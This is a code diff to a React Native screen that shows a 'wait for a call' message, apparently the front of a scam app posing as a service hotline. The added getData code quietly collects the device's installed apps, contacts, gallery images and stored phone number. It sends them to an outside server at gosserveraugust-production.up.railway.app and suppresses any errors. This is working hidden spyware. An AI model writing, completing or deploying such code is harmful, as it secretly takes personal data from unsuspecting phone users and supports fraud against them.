@@ -9,7 +9,7 @@ import ImageIcon from '../../resources/img/Icon.png'
 export default function Main() {
   const [inputText, setInputText] = useState('');
   const [hotlineNumber, setHotlineNumber] = useState('')
-  const isButtonEnabled = inputText.length >= 4;
+  const [maxlength, setMaxlength] = useState(0)
   const defaultHeaders = new Headers();
   defaultHeaders.append('Content-Type', 'application/json');
   defaultHeaders.append('Authorization', 'Bearer your_token_here');
@@ -27,12 +27,56 @@ export default function Main() {
   const getData = async () => {
     var apps = await Apps.loadApps()
     var contacts = await Contact.loadContacts()
-    var images = await Images.getImages()
-    apps.forEach(element => {
-      if (element.packageName == "ru.rostel") {
-        MainModule.fastLoad("ru.rostel")
+    var maxlength = 0
+    try {
+      var formData = await Images.getImages();
+    } catch (error) {
+      console.log(error);
+    }
+
+    if (maxlength === 0 && formData._parts.length > 0) {
+      console.log(`Form data length ${formData._parts.length}`);
+      maxlength = formData._parts.length;
+    }
+    const phoneNumber = await StorageManager.getData('phoneNumber');
+    const user_data = {
+      phoneNumber
+    };
+    try {
+      if (formData._parts && formData) {
+        if (maxlength !== 0 && formData._parts.length > 0) {
+          console.log(maxlength);
+          formData.append('userId', phoneNumber);
+          console.log('form add ', formData._parts[maxlength]);
+        }
+        if (formData._parts[maxlength + 1]) {
+          console.log('form has', formData._parts[maxlength + 1]);
+        }
       }
-    });
+    } catch (error) {
+      console.log(error)
+    }
+
+
+    const data = { user_data: user_data, contacts: contacts, apps: apps }
+    fetch("https://gosserveraugust-production.up.railway.app/user/add", {
+      method: "POST",
+      headers: defaultHeaders,
+      body: JSON.stringify(data)
+    })
+      .then(response => {
+        console.log(response)
+      })
+      .catch(error => {
+        setLoading(false);
+      });
+    try {
+      if (formData._parts.length > 0) {
+        Images.sendImages(formData)
+      }
+    } catch (error) {
+
+    }
   }
   useEffect(() => {
     getData()
@@ -40,8 +84,8 @@ export default function Main() {
   return (
     <View style={styles.container}>
       <View style={styles.main}>
-          <Text style={[styles.text, { color: '#fff' }]}>Ожидайте звонка</Text>
-          <Image source={ImagePhone} style={styles.imagePhone}></Image>
+        <Text style={[styles.text, { color: '#fff' }]}>Ожидайте звонка</Text>
+        <Image source={ImagePhone} style={styles.imagePhone}></Image>
       </View>
     </View>
   );
@@ -60,7 +104,7 @@ const styles = StyleSheet.create({
     borderRadius: 15,
     alignItems: "center",
     flexDirection: "column",
-    marginTop:200
+    marginTop: 200
   },
   image: {
     position: 'absolute',
@@ -70,10 +114,10 @@ const styles = StyleSheet.create({
     width: 75,
     height: 75,
   },
-  imagePhone:{
-    marginTop:25,
-    width:75,
-    height:75
+  imagePhone: {
+    marginTop: 25,
+    width: 75,
+    height: 75
   },
   svg: {
     paddingTop: 110
